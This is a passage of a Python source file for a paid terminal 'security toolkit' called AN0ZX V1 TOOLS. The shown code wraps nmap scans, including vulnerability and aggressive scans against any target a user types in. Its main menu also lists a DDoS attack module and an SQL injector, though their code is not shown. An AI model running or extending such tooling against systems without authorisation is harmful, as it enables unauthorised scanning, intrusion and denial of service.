            elif "database" in line.lower():
                print(Fore.MAGENTA + line)
            elif "table" in line.lower():
                print(Fore.MAGENTA + line)
            elif "dumping" in line.lower():
                print(Fore.GREEN + line)
            elif "error" in line.lower():
                print(Fore.RED + line)
            else:
                print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "=" * 70)
        print(Fore.GREEN + "[✓] SQLMap execution completed")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[✗] Interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# NMap Tool (unchanged)
def nmap_menu():
    """Run real NMap tool"""
    clear_screen()
    typing_effect(NMAP_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "NMAP (REAL TOOL)")
    print(Fore.CYAN + "=" * 70)
    
    # Check if NMap is installed
    try:
        result = subprocess.run(["nmap", "--version"], capture_output=True, text=True)
        if "nmap" not in result.stdout.lower():
            raise FileNotFoundError
    except:
        print(Fore.RED + "[✗] NMap not found!")
        print(Fore.YELLOW + "[!] Install NMap first:")
        print(Fore.CYAN + "    Linux: sudo apt install nmap")
        print(Fore.CYAN + "    Windows: Download from https://nmap.org")
        print(Fore.CYAN + "    Termux: pkg install nmap")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    target = input(Fore.CYAN + "\n[?] Target IP/Hostname: " + Fore.WHITE).strip()
    
    if not target:
        print(Fore.RED + "[✗] Target cannot be empty!")
        return
    
    print(Fore.YELLOW + "\n[+] NMap Scan Options:")
    print(Fore.YELLOW + "[1] Quick Scan (Top 100 ports)")
    print(Fore.YELLOW + "[2] Full Port Scan (1-65535)")
    print(Fore.YELLOW + "[3] OS Detection + Version")
    print(Fore.YELLOW + "[4] Vulnerability Scan")
    print(Fore.YELLOW + "[5] UDP Scan")
    print(Fore.YELLOW + "[6] Aggressive Scan")
    print(Fore.CYAN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-6): " + Fore.WHITE).strip()
    
    commands = {
        '1': f"nmap -T4 -F {target}",
        '2': f"nmap -T4 -p- {target}",
        '3': f"nmap -T4 -O -sV {target}",
        '4': f"nmap -T4 --script vuln {target}",
        '5': f"nmap -T4 -sU -p 53,67,68,69,123,161 {target}",
        '6': f"nmap -T4 -A {target}"
    }
    
    if choice in commands:
        command = commands[choice]
    else:
        command = f"nmap -T4 -A {target}"
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.YELLOW + "[!] Scanning may take several minutes...")
    print(Fore.CYAN + "=" * 70)
    
    try:
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            if "Nmap scan report" in line:
                print(Fore.CYAN + line)
            elif "open" in line and "port" in line:
                print(Fore.GREEN + line)
            elif "closed" in line:
                print(Fore.RED + line)
            elif "filtered" in line:
                print(Fore.YELLOW + line)
            elif "PORT" in line and "STATE" in line:
                print(Fore.MAGENTA + line)
            elif "VULNERABLE" in line:
                print(Fore.RED + line)
            elif "CVE-" in line:
                print(Fore.RED + line)
            elif "Nmap done" in line:
                print(Fore.GREEN + line)
            else:
                print(Fore.WHITE + line)
        
        print(Fore.CYAN + "\n" + "=" * 70)
        print(Fore.GREEN + "[✓] NMap scan completed!")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[✗] Scan interrupted")
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# Goodbye animation (unchanged)
def goodbye_animation():
    """Goodbye animation with typing effect"""
    clear_screen()
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    
    goodbye_text = "Dadah sampai jumpa.."
    
    for i in range(len(goodbye_text) + 10):
        clear_screen()
        current_text = goodbye_text[:i] if i <= len(goodbye_text) else goodbye_text
        color = colors[i % len(colors)]
        print(color + " " * 20 + current_text)
        time.sleep(0.1)
    
    time.sleep(1)
    
    # Final message
    print(Fore.CYAN + "\n" + "=" * 70)
    print(Fore.GREEN + "AN0ZX V1 TOOLS - Professional Security Toolkit")
    print(Fore.YELLOW + "Creator: mrzxx (@Zxxtirwd) & AN0MALIXPLOIT (@An0maliXGR)")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)

# Main program (UPDATED)
def main():
    """Main program entry point"""
    try:
        # Show welcome animation
        welcome_animation()
        
        # Check for existing users
        users = load_users()
        
        if not users:
            print(Fore.YELLOW + "\n[!] No accounts found. Create new account:")
            choice = input(Fore.CYAN + "[?] Create account now? (y/n): ").lower()
            if choice == 'y':
                username = create_account()
                if not username:
                    return
            else:
                print(Fore.RED + "\n[✗] Account required to use AN0ZX Tools")
                return
        else:
            # Login or create account
            clear_screen()
            print(LOGIN_ASCII)
            print(Fore.CYAN + "=" * 70)
            print(Fore.YELLOW + " " * 25 + "AN0ZX V1 TOOLS")
            print(Fore.CYAN + "=" * 70)
            
            print(Fore.YELLOW + "\n[1] Login")
            print(Fore.YELLOW + "[2] Create New Account")
            print(Fore.YELLOW + "[3] Exit")
            print(Fore.CYAN + "-" * 70)
            
            auth_choice = input(Fore.CYAN + "\n[?] Select option (1-3): " + Fore.WHITE).strip()
            
            if auth_choice == "1":
                username = login()
                if not username:
                    return
            elif auth_choice == "2":
                username = create_account()
                if not username:
                    return
            else:
                goodbye_animation()
                return
        
        # Main program loop
        while True:
            show_main_menu(username)
            
            choice = input(Fore.CYAN + "\n[?] Select option (1-6): " + Fore.WHITE).strip()
            
            if choice == "1":
                typing_effect("\nEntering DDOS Attack System...")
                ddos_menu()
            elif choice == "2":
                typing_effect("\nEntering SQL Injector...")
                sql_injector_menu()
            elif choice == "3":
                typing_effect("\nEntering SQLMap Tool...")
                target = input(Fore.CYAN + "[?] Target URL for SQLMap: " + Fore.WHITE).strip()
                if target:
                    run_sqlmap_tool(target)
            elif choice == "4":
                typing_effect("\nEntering NMap Tool...")
                nmap_menu()
            elif choice == "5":
                typing_effect("\nEntering OSINT Intelligence System...")
                osint_menu()
            elif choice == "6":
                goodbye_animation()
                break
            else:
                print(Fore.RED + "[✗] Invalid choice!")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[✗] Program interrupted!")
        goodbye_animation()
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
        input(Fore.YELLOW + "\n[?] Press Enter to exit...")

if __name__ == "__main__":
    # Check requirements
    try:
        import colorama
        import requests
    except ImportError:
        print(Fore.RED + "[!] Installing required packages...")
        os.system("pip install colorama requests > /dev/null 2>&1")
        print(Fore.GREEN + "[✓] Requirements installed!")
        time.sleep(2)
    
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + "AN0ZX V1 TOOLS - Professional Security Toolkit")
    print(Fore.GREEN + "Price: Rp 12.000 | Contact: @Zxxtirwd or @An0maliXGR")
    print(Fore.CYAN + "=" * 70)
    time.sleep(2)
    
    main()
